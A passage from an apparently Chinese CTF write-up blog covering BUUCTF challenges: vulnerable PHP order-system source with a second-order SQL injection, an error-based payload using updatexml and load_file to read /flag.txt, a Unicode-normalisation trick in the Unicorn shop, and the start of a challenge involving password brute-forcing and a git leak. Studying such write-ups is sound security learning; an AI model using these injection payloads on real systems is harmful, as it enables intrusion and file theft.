<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"user_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"address"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"phone"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
    <span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token string">'/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'</span><span class="token punctuation">;</span>
    <span class="token variable">$user_name</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"user_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$address</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"address"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$phone</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"phone"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span><span class="token variable">$user_name</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span><span class="token variable">$phone</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'no sql inject!'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'"</span><span class="token punctuation">;</span>
        <span class="token variable">$fetch</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$fetch</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">num_rows</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token variable">$user_name</span><span class="token punctuation">.</span><span class="token string">"已提交订单"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)"</span><span class="token punctuation">;</span>
        <span class="token variable">$re</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$re</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token string">"sss"</span><span class="token punctuation">,</span> <span class="token variable">$user_name</span><span class="token punctuation">,</span> <span class="token variable">$address</span><span class="token punctuation">,</span> <span class="token variable">$phone</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$re</span> <span class="token operator">=</span> <span class="token variable">$re</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$re</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string">'error'</span><span class="token punctuation">;</span>
            <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            exit<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"订单提交成功"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"信息不全"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span></code></pre>
<pre class=" language-php"><code class="language-php"><span class="token shell-comment comment">#delete.php</span>
<span class="token delimiter">&lt;?php</span>

<span class="token keyword">require_once</span> <span class="token string">"config.php"</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"user_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"phone"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
    <span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token string">'/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'</span><span class="token punctuation">;</span>
    <span class="token variable">$user_name</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"user_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$phone</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"phone"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span><span class="token variable">$user_name</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span><span class="token variable">$phone</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> 
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'no sql inject!'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'"</span><span class="token punctuation">;</span>
        <span class="token variable">$fetch</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$fetch</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$fetch</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">num_rows</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$fetch</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">'delete from `user` where `user_id`='</span> <span class="token punctuation">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">"user_id"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string">'error'</span><span class="token punctuation">;</span>
            <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            exit<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"订单删除成功"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"未找到订单!"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"信息不全"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span></code></pre>
<pre class=" language-php"><code class="language-php"><span class="token shell-comment comment">#index.php</span>
<span class="token delimiter">&lt;?php</span>

<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'open_basedir'</span><span class="token punctuation">,</span> <span class="token string">'/var/www/html/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">// $file = $_GET["file"];</span>
<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/phar|zip|bzip2|zlib|data|input|%00/i"</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string">'no way!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        exit<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    @<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span></code></pre>
<pre class=" language-php"><code class="language-php"><span class="token shell-comment comment">#search.php</span>
<span class="token delimiter">&lt;?php</span>

<span class="token keyword">require_once</span> <span class="token string">"config.php"</span><span class="token punctuation">;</span> 

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"user_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"phone"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
    <span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token string">'/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'</span><span class="token punctuation">;</span>
    <span class="token variable">$user_name</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"user_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$phone</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"phone"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span><span class="token variable">$user_name</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span><span class="token variable">$phone</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> 
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'no sql inject!'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'"</span><span class="token punctuation">;</span>
        <span class="token variable">$fetch</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$fetch</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$fetch</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">num_rows</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$fetch</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$row</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string">'error'</span><span class="token punctuation">;</span>
            <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            exit<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"&lt;p>姓名:"</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'user_name'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"&lt;/p>&lt;p>, 电话:"</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'phone'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"&lt;/p>&lt;p>, 地址:"</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'address'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"&lt;/p>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"未找到订单!"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"信息不全"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span></code></pre>
<p>重点关注change.php。</p>
<p>这个过滤只是看起来很严谨，但实际上他只对user_name和phone做了过滤，而参数address却被放过了，只对它进行了转义。</p>
<pre class=" language-php"><code class="language-php"><span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token string">'/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'</span><span class="token punctuation">;</span>
<span class="token variable">$user_name</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"user_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$address</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"address"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phone</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"phone"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span><span class="token variable">$user_name</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span><span class="token variable">$phone</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'no sql inject!'</span><span class="token punctuation">;</span>
   <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre>
<p>再向下看代码：</p>
<p>这一部分原本意图是更改地址，但却把旧地址作为old_address重新存入了数据库中，而且再次进行了查询。</p>
<p>也就是说，如果先提交一个有单引号之类字符的payload，再用随便一个数据把它顶替成old_address，那么payload就不会被addslashes函数限制，并且作为old_address被成功触发。</p>
<pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//change.php</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$fetch</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$fetch</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">num_rows</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$fetch</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"update `user` set `address`='"</span><span class="token punctuation">.</span><span class="token variable">$address</span><span class="token punctuation">.</span><span class="token string">"', `old_address`='"</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'address'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"' where `user_id`="</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'user_id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string">'error'</span><span class="token punctuation">;</span>
        <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        exit<span class="token punctuation">;</span>
    <span class="token punctuation">}</span></code></pre>
<p>结合报错注入，payload如下：</p>
<pre><code>1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#39;/flag.txt&#39;),1,50)),0x7e),1)#</code></pre><p>结果load_file就显示了后半截。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201207172844718.png" srcset="/img/loading.gif" alt="image-20201207172844718"></p>
<p>再读下前面的</p>
<pre><code>1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#39;/flag.txt&#39;),1,30)),0x7e),1)#</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201207173052006.png" srcset="/img/loading.gif" alt="image-20201207173052006"></p>
<h1 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h1><p><strong>考点：unicode转换安全</strong></p>
<p>这个点确实没细看过。这次整理一下。</p>
<p>简单来看，Unicode的安全问题分为</p>
<p><strong>视觉欺骗</strong>：视觉问题一般指几个不同的不同的字符在某个字体下看起来较为相同。可能是字符之间一对一相似、多个字符的组合字符和一个字符相似等。</p>
<p>具体分类参考：</p>
<p><strong>非视觉漏洞</strong>：这些问题主要字符是转换导致的字符串。</p>
<blockquote>
<p>这种等价是字符或字符序列之间比较弱的等价类型，这些变体形式可能代表在某些字体或语境中存在视觉上或意义上的相似性。举例来说，a 和ａ(\uff41)在某些字体下看起来可能相同，15和⑮(\u246e)其表示的数学意义可能相同，</p>
</blockquote>
<p>参考：</p>
<p>回到题目，是个独角兽商店。看这意思就是想让你把最贵那个买下来。</p>
<p>可以看见输入1337后它提示只允许输入一个字符。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201207170443087.png" srcset="/img/loading.gif" alt="image-20201207170443087"></p>
<p>那么在网站<a href="https://www.compart.com/en/unicode/里找到一个值大于1337的字符就可以了。我选择了下面这个字符。" target="_blank" rel="noopener">https://www.compart.com/en/unicode/里找到一个值大于1337的字符就可以了。我选择了下面这个字符。</a></p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201207170751695.png" srcset="/img/loading.gif" alt="image-20201207170751695"></p>
<p>输入后得到flag。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201207170844549.png" srcset="/img/loading.gif" alt="image-20201207170844549"></p>
<h1 id="网鼎杯-2018-Comment"><a href="#网鼎杯-2018-Comment" class="headerlink" title="[网鼎杯 2018]Comment"></a>[网鼎杯 2018]Comment</h1><p><strong>考点：二次注入</strong></p>
<p>进去是个留言板。想随便提交点东西进去结果要你先登录。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201207173518227.png" srcset="/img/loading.gif" alt="image-20201207173518227"></p>
<p>看这意思那就先爆破一下密码：zhangwei666</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201207183926137.png" srcset="/img/loading.gif" alt="image-20201207183926137"></p>
<p>顺便扫了一下，诶，git泄露。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201207184254128.png" srcset="/img/loading.gif" alt="image-20201207184254128"></p>
<p>结果就这一个文件，看起来也没啥用。</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>

<span class="token keyword">include</span> <span class="token string">"mysql.php"</span><span class="token punctuation">;</span>

<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'login'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'yes'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>

  <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: ./login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'do'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>

<span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'do'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token punctuation">{</span>

<span class="token keyword">case</span> <span class="token string">'write'</span><span class="token punctuation">:</span>

  <span class="token keyword">break</span><span class="token punctuation">;</span>

<span class="token keyword">case</span> <span class="token string">'comment'</span><span class="token punctuation">:</span>

  <span class="token keyword">break</span><span class="token punctuation">;</span>

<span class="token keyword">default</span><span class="token punctuation">:</span>

  <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span>

<span class="token punctuation">}</span>

<span class="token keyword">else</span><span class="token punctuation">{</span>

  <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span>

<span class="token delimiter">?></span></code></pre>
<p>控制台这看到</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201207184919010.png" srcset="/img/loading.gif" alt="image-20201207184919010"></p>
<p>又回githack恢复</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201207205744610.png" srcset="/img/loading.gif" alt="image-20201207205744610"></p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201207210021449.png" srcset="/img/loading.gif" alt="image-20201207210021449"></p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">include</span> <span class="token string">"mysql.php"</span><span class="token punctuation">;</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'login'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'yes'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: ./login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'do'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
<span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'do'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
<span class="token keyword">case</span> <span class="token string">'write'</span><span class="token punctuation">:</span>
    <span class="token variable">$category</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'category'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$title</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$sql</span> <span class="token operator">=</span> "insert into board
            set category <span class="token operator">=</span> <span class="token string">'$category'</span><span class="token punctuation">,</span>
                title <span class="token operator">=</span> <span class="token string">'$title'</span><span class="token punctuation">,</span>
                content <span class="token operator">=</span> <span class="token string">'$content'</span>"<span class="token punctuation">;</span>
    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">break</span><span class="token punctuation">;</span>
<span class="token keyword">case</span> <span class="token string">'comment'</span><span class="token punctuation">:</span>
    <span class="token variable">$bo_id</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'bo_id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select category from board where id='$bo_id'"</span><span class="token punctuation">;</span>
